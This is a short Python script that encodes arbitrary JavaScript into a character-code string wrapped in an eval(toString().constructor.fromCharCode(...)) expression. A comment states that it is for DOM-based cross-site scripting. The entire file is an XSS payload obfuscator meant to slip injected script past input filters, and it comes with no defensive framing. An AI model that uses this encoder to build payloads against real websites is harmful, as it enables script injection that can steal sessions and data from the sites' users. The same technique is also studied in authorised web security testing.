import argparse

def convert_to_chrcode(javascript_code:str):
    """Convert letter to character code"""
    acc = []
    for letter in javascript_code:
        acc.append(ord(letter))

    return acc

def form_packet(js_code:str):
    converted_code = convert_to_chrcode(js_code)
    return f"eval(toString().constructor.fromCharCode({str(converted_code).replace(' ','')[1:-1]}))"

if __name__ == "__main__":
    #For DOM-Based XSS
    parser = argparse.ArgumentParser()
    parser.add_argument("js_code", help="Javascript code enclosed in quotes (\" or \')")
    args = parser.parse_args()
    print(form_packet(args.js_code))



